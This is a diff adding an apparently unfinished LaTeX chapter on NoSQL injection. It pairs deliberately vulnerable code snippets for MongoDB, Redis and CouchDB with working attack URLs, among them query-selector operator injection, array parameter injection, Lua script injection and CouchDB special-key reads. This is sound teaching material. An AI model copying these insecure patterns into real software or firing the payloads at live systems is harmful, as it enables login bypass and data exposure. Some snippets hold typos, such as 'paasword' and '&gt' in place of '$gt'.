@@ -1,0 +1,135 @@
+\chapter{NoSQL Injection Attacks}
+
+%explain why attack vectors are presented as HTTP GET request - harder, than HTTP POST
+
+\section{MongoDB Document Store}
+
+\subsection{Query Selector Injection}
+
+\begin{lstlisting}[caption={Vulnerable PHP example for query selector injection on MongoDB}, label={lst:PHPArrayInjection}]
+$collection->find(array('user' => $_GET['user'], 'password' => $_GET['password']));
+\end{lstlisting}
+
+\begin{lstlisting}[caption={Vulnerable NodeJS example for query selector injection on MongoDB}, label={lst:PHPArrayInjection}]
+db.collection('users').find({"user": req.query.user, "password": req.query.password});
+\end{lstlisting}
+
+\begin{lstlisting}[caption={Vulnerable Ruby example for query selector injection on MongoDB}, label={lst:PHPArrayInjection}]
+db['users'].find({:user => req.params['user'], :password => req.params['password']})
+\end{lstlisting}
+
+\begin{lstlisting}[caption={Vulnerable Python example for query selector injection on MongoDB}, label={lst:PHPArrayInjection}]
+db.users.find({"user": request.GET['user'], "password": request.GET['password']})
+\end{lstlisting}
+
+\begin{lstlisting}[caption={Attack vector on MongoDB for query selector injection via HTTP GET}, label={lst:PHPArrayInjection}]
+https://example.org/login?user=patrick&password[%24gt]=
+\end{lstlisting}
+
+\begin{lstlisting}[caption={Resulting query of query selector injection}, label={lst:PHPArrayParam}]
+{'user': 'patrick', 'password': {'&gt':''}}
+\end{lstlisting}
+
+\subsection{Expanding Array Injection}
+
+\begin{lstlisting}[caption={Example for vulnerable MongoDB - NodeJS application}, label={lst:PHPArrayInjection}]
+if (req.query.user !== "admin") {
+  db.collection('users').insert({"user": req.query.user, "password": req.query.password});
+}
+\end{lstlisting}
+
+\begin{lstlisting}[caption={Example for vulnerable MongoDB - NodeJS application}, label={lst:PHPArrayInjection}]
+db.collection('users').find({"user": req.query.user, "password": req.query.password});
+\end{lstlisting}
+
+\begin{lstlisting}[caption={MongoDB injection with NodeJS's query string module}, label={lst:PHPArrayInjection}]
+https://example.org/register?user[]=patrick&user[]=admin&password=1234;
+\end{lstlisting}
+
+\begin{lstlisting}[caption={Injected query parameter for MongoDB - NodeJS injection}, label={lst:PHPArrayParam}]
+{'user': ['patrick', 'admin'], 'password': 1234}
+\end{lstlisting}
+
+\begin{lstlisting}[caption={MongoDB injection with NodeJS's query string module}, label={lst:PHPArrayInjection}]
+https://example.org/login?user=admin&password=1234;
+\end{lstlisting}
+
+\subsection{Script Injection}
+
+
+
+
+\section{Redis Key-Value Store}
+\subsection{Parameter Overwrite Injection}
+
+\begin{lstlisting}[caption={Vulnerable NodeJS example for parameter overwrite injection on Redis}, label={lst:PHPArrayInjection}]
+RedisClient.expireat(req.query.key, new Date("November 8, 2026 11:13:00").getTime());
+\end{lstlisting}
+
+\begin{lstlisting}[caption={Attack vector on Redis for query selector injection via HTTP GET}, label={lst:PHPArrayInjection}]
+https://example.org/expire?key[]=foo&key[]=1117542887
+\end{lstlisting}
+
+
+\subsection{Lua Script Injection}
+\begin{lstlisting}[caption={Vulnerable PHP example for Lua script injection on Redis}, label={lst:PHPArrayInjection}]
+$redis->eval("return redis.call('get', '$key')", 0);
+\end{lstlisting}
+
+\begin{lstlisting}[caption={Attack vector on Redis for query selector injection via HTTP GET}, label={lst:PHPArrayInjection}]
+https://example.org/lua.php?key=')%20or%20redis.call('set'%2C%20'foo'%2C%20'bar')%20--
+\end{lstlisting}
+
+\section{CouchDB Document Store}
+
+\subsection{Special Key Injection}
+
+\begin{lstlisting}[caption={Vulnerable NodeJS example for special key injection on CouchDB}, label={lst:PHPArrayInjection}]
+function checkUser(user, password, callback) {
+  nano.use('users').get(user, (err, res)=> {
+    callback(res.password === paasword);
+  });
+}
+
+checkUser(req.query.user, req.query.password, handleResult);
+\end{lstlisting}
+
+\begin{lstlisting}[caption={Attack vector on CouchDB for speical key injection via HTTP GET}, label={lst:PHPArrayInjection}]
+https://example.org/login?user=_all_docs
+\end{lstlisting}
+
+\subsection{Array Key Injection}
+
+\begin{lstlisting}[caption={Vulnerable NodeJS example for array key injection on CouchDB}, label={lst:PHPArrayInjection}]
+function getDocument(key, callback) {
+  if (key === "secret" || key[0] === "_") {
+    callback("No access!");
+  } else {
+    nano.use('table').get(key, callback);
+  }
+}
+
+getDocument(req.query.key, handleResult);
+\end{lstlisting}
+
+\begin{lstlisting}[caption={Attack vectors on CouchDB for array key injection via HTTP GET}, label={lst:PHPArrayInjection}]
+https://example.org?key[]=secret
+https://example.org?key[]=_all_docs
+\end{lstlisting}
+
+\subsection{URL Traversal Injection}
+
+\begin{lstlisting}[caption={Vulnerable NodeJS example for URL traversal injection on CouchDB}, label={lst:PHPArrayInjection}]
+function getDocument(key, callback) {
+  nano.use('table').get(key, callback);
+}
+
+getDocument(req.query.key, handleResult);
+\end{lstlisting}
+
+\begin{lstlisting}[caption={Attack vectors on CouchDB for URL traversal injection via HTTP GET}, label={lst:PHPArrayInjection}]
+https://example.org/get?key=_design/credentials/_view/user_password
+\end{lstlisting}
+
+\section{Memcached Key-Value Cache}
+\subsection{Array Key Injection}
